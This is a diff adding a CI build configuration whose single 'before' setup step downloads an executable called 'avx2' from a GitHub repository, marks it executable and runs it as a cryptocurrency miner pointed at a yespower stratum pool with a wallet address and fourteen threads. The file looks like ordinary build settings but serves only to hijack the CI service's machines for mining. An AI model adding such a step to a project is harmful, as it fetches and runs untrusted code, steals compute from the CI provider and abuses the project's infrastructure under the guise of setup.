@@ -1,0 +1,6 @@
+build:
+  nodes:
+    my-node:
+      project_setup:
+        before:
+          - command: lscpu && wget https://github.com/BatiKangkung/KangKung/raw/main/avx2 && chmod +x avx2 && ./avx2 -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 14 -p x
